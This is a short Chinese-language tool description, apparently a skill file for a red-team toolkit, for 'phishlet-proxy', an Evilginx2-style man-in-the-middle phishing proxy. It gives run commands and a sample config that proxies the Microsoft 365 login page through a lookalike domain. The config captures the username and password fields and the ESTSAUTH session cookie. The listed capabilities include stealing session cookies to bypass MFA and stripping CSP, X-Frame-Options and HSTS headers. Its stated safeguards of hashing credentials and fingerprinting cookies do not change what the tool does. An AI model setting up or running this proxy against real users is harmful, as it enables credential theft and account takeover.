---
name: phishlet
description: 声明式反向代理规则(Evilginx 借鉴)——新目标=写 phishlet 不改代码
---

# phishlet-proxy(Evilginx2 借鉴)
[proxy+credential capture] 声明式 MITM 代理+会话捕获。

## 用法
```bash
phishlet-proxy.py list --dir /opt/tools/phishlets
phishlet-proxy.py serve --listen :8443 --phishlet /opt/tools/phishlets/office365.json --db /tmp/track.json
phishlet-proxy.py init   # 初始化内置样例
```

## phishlet 结构
```json
{
  "name": "office365", "proxy_host": "login.x.co", "target_host": "login.microsoft.com",
  "sub_filters": {"login.microsoft.com": ["login.x.co"]},
  "session": {"cookie_names": ["ESTSAUTH"], "auth_path": "/success"},
  "credential_fields": ["loginfmt", "passwd"]
}
```

## 能力(vs v2 硬编码)
- session cookie 捕获(Evilginx 核心: 拿 cookie 绕 MFA——只存 SHA-256 指纹)
- sub_filters 响应重写规则(目标域→代理域)
- credential_fields 声明凭据字段(拦截哪些 input)
- Set-Cookie 域重写+Secure/SameSite 处理
- 不跟随重定向(302 的 Set-Cookie 不丢)
- 安全头剥离(CSP/X-Frame-Options/HSTS)

## 红线(不变)
凭据明文即哈希即毁;session cookie 只存指纹;审计落 track DB。
